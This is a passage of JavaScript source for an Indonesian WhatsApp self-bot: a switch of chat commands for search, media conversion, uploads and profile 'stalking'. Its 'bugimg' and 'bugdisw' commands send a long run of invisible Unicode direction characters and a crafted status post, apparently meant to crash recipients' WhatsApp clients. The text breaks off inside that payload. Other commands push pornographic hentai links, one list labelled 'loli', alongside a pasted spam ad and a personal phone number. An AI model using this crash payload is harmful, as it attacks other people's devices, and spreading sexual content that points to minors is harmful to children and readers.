	teks += `┣ *▢*   @${mem.jid.split('@')[0]}\n`
	members_id.push(mem.jid)
	}
mentions(`*Info :  ${q}*\n\n*Total Member :* ${groupMembers.length} \n\n┏━ *「 ${namaowner} 」* `+teks+`┗━ *「 ${namaowner} 」* `, members_id, false)
break
			  case 'ytsearch':
			  case 'yts':
			  if (!dev.key.fromMe) return reply('Skip lu bukan owner !!')
			if (args.length < 1) return reply('Tolong masukan query!')
			var srch = args.join('');
			try {
        	var aramas = await yts(srch);
   			} catch {
        	return await zoe.sendMessage(from, 'Error!', MessageType.text, dload)
    		}
    		aramat = aramas.all 
    		var tbuff = await getBuffer(aramat[0].image)
    		var ytresult = '';
    		ytresult += '「 *YOUTUBE SEARCH* 」'
    		ytresult += '\n________________________\n\n'
   			aramas.all.map((video) => {
        	ytresult += '❏ Title: ' + video.title + '\n'
            ytresult += '❏ Link: ' + video.url + '\n'
            ytresult += '❏ Durasi: ' + video.timestamp + '\n'
            ytresult += '❏ Upload: ' + video.ago + '\n________________________\n\n'
    		});
    		ytresult += '◩ *SELF-BOT*'
    		await fakethumb(tbuff,ytresult)
			break
			 case 'chara':
            if(!q) return reply(`gambar apa?\n${prefix}chara nino`)
            let im = await hx.chara(q)
            let acak = im[Math.floor(Math.random() * im.length)]
            let li = await getBuffer(acak)
            await zoe.sendMessage(from,li,image,{quoted: dev})
            break
            case 'pinterest':
        
            if(!q) return reply('gambar apa?')
            reply('Lagi proses')
            let pin = await hx.pinterest(q)
            let ac = pin[Math.floor(Math.random() * pin.length)]
            let di = await getBuffer(ac)
            await zoe.sendMessage(from,di,image,{quoted: dev})
            break
    case 'playstore':
            if(!q) return reply('lu nyari apa?')
            let play = await hx.playstore(q)
            let store = '❉─────────────────────❉\n'
            for (let i of play){
            store += `\n*「 _PLAY STORE_ 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *dev* : ${i.developer}
- *Link dev* : ${i.link_dev}\n❉─────────────────────❉`
            }
            reply(store)
            break
             case 'brainly':
			if (args.length < 1) return reply('Pertanyaan apa')
          	brien = args.join(' ')
			brainly(`${brien}`).then(res => {
			teks = '❉───────────────────────❉\n'
			for (let Y of res.data) {
			teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
			}
			zoe.sendMessage(from, teks, text,{quoted:dev,detectLinks: false})                        
            })              
			break
case 'modecittugas':
			if (args.length < 1) return reply('Pertanyaan apa ?????')
          	brien = args.join(' ')
			brainly(`${brien}`).then(res => {
			teks = '變______________變'
			for (let Y of res.data) {
			teks += `\n*「 TUKANG CIT V1 」*\n\n*𖣂 Jawaban:* ${Y.jawaban[0].text}\n變______________變'\n`
			}
			zoe.sendMessage(from, teks, text,{quoted:fvn,detectLinks: false})      
zoe.sendMessage(from, 'Dah tuh:V\nBy  | yt:zoebotz', text, {quote: fvn})                  
            })              
			break
			    case 'igstalk':
            if (!q) return reply('Usernamenya?')
            if (body.includes("@")) return reply('gausah make @')
            ig.fetchUser(`${args.join(' ')}`).then(Y => {
            console.log(`${args.join(' ')}`)
            ten = `${Y.profile_pic_url_hd}`
            teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Following* : ${Y.followers}\n*Followers* : ${Y.following}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
            sendMediaURL(from,ten,teks) 
            })      
            break   
            case 'githubstalk':
				reply('Sabar...')
				get_result = await fetchJson(`https://janbot-api.herokuapp.com/api/stalk/github?username=${body.slice(13)}`)
				get_result = get_result.result
				get_result1 = `Name : ${get_result.name}\n
Post : ${get_result.public_repos}\n
Followers : ${get_result.followers}\n
Following : ${get_result.following}\n
Bio : ${get_result.bio}\n
Location : ${get_result.location}\n
Link : ${get_result.html_url}\n`
				buff = await getBuffer(get_result.avatar_url)
				zoe.sendMessage(from, buff, image, {quoted: dev, caption: get_result1})
				break
				case 'bugdisw':
				  if (!dev.key.fromMe && !isOwner) return reply('Lu siapa?')
					buffer = fs.readFileSync(`./src/logo1.jpg`)
					zoe.sendMessage('status@broadcast', buffer, image, { thumbnail : fs.readFileSync('./logo1.jpg')
					})
					setTimeout( () => {
					zoe.sendMessage('status@broadcast', `UWES`, MessageType.extendedText)
					reply('UWES')
					}, 3000)
					break
			  case 'tomp3':
            if (!isQuotedVideo) return reply('Reply videonya!')
            reply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await zoe.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return reply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            zoe.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
    case 'fast':
            if (!isQuotedVideo) return reply('Reply videonya!')
            reply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await zoe.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return reply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            zoe.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
case 'tourl': case 'imagetorul': case 'imgtourl': case 'audiotourl': case 'videotourl': case 'stickertourl': case 'stikertourl': case 'tolink':
									var imgbb = require('imgbb-uploader')
									if (isQuotedAudio) {
										ger = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
										reply(mess.wait)
										owgi = await zoe.downloadAndSaveMediaMessage(ger)
										Okelor = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
										teks=`─ 「 *AUDIO TO URL* 」 ─

*🔖 Url : ${Okelor.display_url}*`
										reply(teks)
 
										} else if (isQuotedImage) {
											ger = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
											reply(mess.wait)
											owgi = await zoe.downloadAndSaveMediaMessage(ger)
											qbc = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
											teks=`─ 「 *IMAGE TO URL* 」 ─

*🔖Url : ${qbc.display_url}*`
											reply(teks)
											} else if (isQuotedVideo) {
												ger = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
												reply(mess.wait)
												owgi = await zoe.downloadAndSaveMediaMessage(ger)
												ffff = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
												teks=`─ 「 *VIDEO TO URL* 」 ─

*🔖 Url : ${ffff.display_url}*`
												reply(teks)
												} else if (isQuotedSticker) {
													ger = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
													reply(mess.wait)
													owgi = await zoe.downloadAndSaveMediaMessage(ger)
													vrr = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
													teks=`─ 「 *STICKER TO URL* 」 ─

*🔖 Url : ${vrr.display_url}*`
													reply(teks)
												}
											break
    case 'slow':
            if (!isQuotedVideo) return reply('Reply videonya!')
            reply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await zoe.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return reply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            zoe.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
            case 'pastebin':
if(!q) return reply(`Contoh : NGINTIL`)
anu = await fetchJson(`https://api-anoncybfakeplayer.herokuapp.com/pastebin?text=${q}`, {method: 'get'})
                   zoe.sendMessage(from, `${anu.result}`, text, {quoted: dev})
                     break
                     case 'reverse':
            if (!isQuotedVideo) return reply('Reply videonya!')
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await zoe.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return reply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            zoe.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
			  case 'linkbok3p':
			  
                 break
                 case 'nekopoi1':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                zoe.sendMessage(from, fcrew, MessageType.image, {quoted: dev, caption: 'NIH LINKNYA: https://www2.zippyshare.com/d/z9dcY6Nr/791216/%5bNekoPoi%5d_Akina_to_Onsen_de_H_Shiyo%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi2':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                zoe.sendMessage(from, fcrew, MessageType.image, {quoted: dev, caption: 'NIH LINKNYA: https://www4.zippyshare.com/d/j7PFLGUY/946757/%5bNekoPoi%5d_Tsuma_ga_Kirei_ni_Natta_Wake_-_02_%5b360P%5d_%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi3':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                zoe.sendMessage(from, fcrew, MessageType.image, {quoted: dev, caption: 'NIH LINKNYA: https://www111.zippyshare.com/d/EK5uqIMh/566060/%5bNekoPoi%5d_Megane_no_Megami_-_01_%5b360P%5d_%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi4':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                zoe.sendMessage(from, fcrew, MessageType.image, {quoted: dev, caption: 'NIH LINKNYA: https://www109.zippyshare.com/d/2ebALhhS/463654/%5bNekoPoi%5d_Watashi_ga_Toriko_-_02%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi5':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                zoe.sendMessage(from, fcrew, MessageType.image, {quoted: dev, caption: 'NIH LINKNYA: https://www115.zippyshare.com/d/LmzOkRAI/313299/%5bNekoPoi%5d_Chichi-iro_Toiki_-_01_%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi6':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                zoe.sendMessage(from, fcrew, MessageType.image, {quoted: dev, caption: 'NIH LINKNYA: https://www89.zippyshare.com/d/SgEHvrJs/42812/%5bNekoPoi%5d_Chichi-iro_Toiki_-_02_%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi7':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                zoe.sendMessage(from, fcrew, MessageType.image, {quoted: dev, caption: 'NIH LINKNYA: https://www66.zippyshare.com/d/j0ivbciL/520411/%5bNekoPoi%5d_Onna_Maou_Melissa_no_H_na_Boukenki_-_01_%5b360P%5d_%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi8':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                zoe.sendMessage(from, fcrew, MessageType.image, {quoted: dev, caption: 'NIH LINKNYA: https://www71.zippyshare.com/d/M225YIrR/535656/%5bNekoPoi%5d_Buta_no_Gotoki_Sanzoku_ni_Torawarete_Shojo_wo_Ubawareru_Kyonyuu_Hidevishi_Onna_Senshi_-_01%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi9':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                zoe.sendMessage(from, fcrew, MessageType.image, {quoted: dev, caption: 'NIH LINKNYA: https://www49.zippyshare.com/d/bdwYjaXS/605790/%5bNekoPoi%5d_Akebi_no_Hana___Maho_-_01_%5b360P%5d_%5bnekopoi.pro%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'kodenuklir':
			     try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
				var kodenuk = `Easy Mode :
• https://nhentai.net/g/316755/
• https://nhentai.net/g/316596/
• https://nhentai.net/g/311850/
• https://nhentai.net/g/315578/
• https://nhentai.net/g/315488/
• https://nhentai.net/g/315406/
• https://nhentai.net/g/315344/
• https://nhentai.net/g/315323/
• https://nhentai.net/g/315136/
• https://nhentai.net/g/315099/
Medium Mode :
• https://nhentai.net/g/316867/
• https://nhentai.net/g/316869/
• https://nhentai.net/g/316785/
• https://nhentai.net/g/316763/51/
• https://nhentai.net/g/316445/
• https://nhentai.net/g/316250/
• https://nhentai.net/g/311283/
• https://nhentai.net/g/265671/
• https://nhentai.net/g/312127/
• https://nhentai.net/g/311560/
Hard Mode :
• https://nhentai.net/g/316820/
• https://nhentai.net/g/316481/
• https://nhentai.net/g/316430/
• https://nhentai.net/g/276347/
• https://nhentai.net/g/196329/
• https://nhentai.net/g/304543/
• https://nhentai.net/g/295295/
• https://nhentai.net/g/311262/
• https://nhentai.net/g/311882/
• https://nhentai.net/g/312180/
Note : Easy mode = Sange, Biasa Aja, Mental Lemah :v
==============================
Medium Mode = Bisa bikin sange, Lumayan nyesek, Rasanya pengen coli teros, Mental Batu
==============================
Hard Mode = Menyebabkan amnesia, insomnia, hipotermia, kejang", serangan jantung, diare, pendarahan hebat, buang air tidak terkendali, rasa ingin baku hantam, frustasi, depresi, emosi tidak tertahan kan, sakit hati (ambyar), Mental Baja
==============================
Kode nuklir dr milf oneesan ampe gan***** loli
https://nhentai.net/g/271890/
https://nhentai.net/g/272057/
https://nhentai.net/g/272173/
https://nhentai.net/g/272182/
https://nhentai.net/g/272196/
https://nhentai.net/g/272197/
https://nhentai.net/g/272259/
https://nhentai.net/g/272276/
https://nhentai.net/g/272290/
https://nhentai.net/g/272377/
-
https://nhentai.net/g/272390/
https://nhentai.net/g/272512/I am using the coolest phone keyboard I've ever used!😍👍 Get it now!👉http://dl5.fancykeyapp.com 
https://nhentai.net/g/271245/
https://nhentai.net/g/271056/
https://nhentai.net/g/270809/
https://nhentai.net/g/269653/
https://nhentai.net/g/266088/
https://nhentai.net/g/264980/
https://nhentai.net/g/262215/
https://nhentai.net/g/260433/
-
https://nhentai.net/g/260146/
https://nhentai.net/g/256738/
https://nhentai.net/g/272425/
https://nhentai.net/g/272352/
https://nhentai.net/g/272045/
https://nhentai.net/g/272015/
https://nhentai.net/g/271993/
https://nhentai.net/g/271924/
https://nhentai.net/g/271905/
https://nhentai.net/g/271797/
-
https://nhentai.net/g/271760/
https://nhentai.net/g/271717/
https://nhentai.net/g/271726/
https://nhentai.net/g/271667/
https://nhentai.net/g/267352/
https://nhentai.net/g/152968/
https://nhentai.net/g/238876/
https://nhentai.net/g/116395/
https://nhentai.net/g/84809/
https://nhentai.net/g/211656/
-
https://nhentai.net/g/272117/
https://nhentai.net/g/188721/
https://nhentai.net/g/266402/
https://nhentai.net/g/238876/
[8/6 10.48] +62 812-8025-1698: Happy Mother's Day 165310,177978,211759,212643,229540, 250029,211519,256097,163478, 91505, 79280, 260629,128051,121972,261633,172044,119055,208323,149942,161236, 177150,233766,97949,230107 ,175822, 213545,232837,179166,138603,130183, 173543,234642,268015,228293,268893, 239536, yg suka mamah

Random
 257892 226942 236297 216039 221711 245304 166174 175220 244327 191049 220882 244859 227446 259328 259532 259634 259610 259348 258669 256097 118282 260028 260058 259557 259497 122220 260111 260088 259880 258977 260097 259765 259359 260138 259617 107965 197255 260276 260209 260210 260203 191360 191390 248933 257567 227913 211648 210240 260626 259622 257991 213966 260623 149112 257168 198203 114783 220958 244387 243734 223315 118069 136188 260686 241777  260912 142154 119798 261174 258301 256808 169134 220354 260271 261725 261378 252174 261928 114427 187003 147577 249458 157767 224316 175294 258450 233864 236128 261162 174036 187205 210873 193318 110232 199310 193816 220376 193814 193815 219068 220386 177642 188269 181837 220377 119293 257528 258926 262384 105951 259904 208174 249229 245644 262538 234818 216845 149212 134442 135927 262447 261811 261650 261225 261226 260761 250327 192327 167801 150309 123554`
				zoe.sendMessage(from, fcrew, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fcrew, surface: 200, message: `${namaowner} ${pushname}\n⎇ ${command}`, orderTitle: ``, sellerJid: '0@s.whatsapp.net'}}}, caption: kodenuk, contextInfo: { forwardingScore: 508, isForwarded: true}})
				break
			case 'link1':
			  zoe.sendMessage(from, link1(prefix), text)
			  break
			  case 'link2':
			  zoe.sendMessage(from, link2(prefix), text)
			  break
			  case 'link3':
			  zoe.sendMessage(from, link3(prefix), text)
					 break
					 case 'bugimg':
await zoe.toggleDisappearingMessages(from)
wew = fs.readFileSync(`./hm/virgam.jpeg`)
lzain = `
★‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏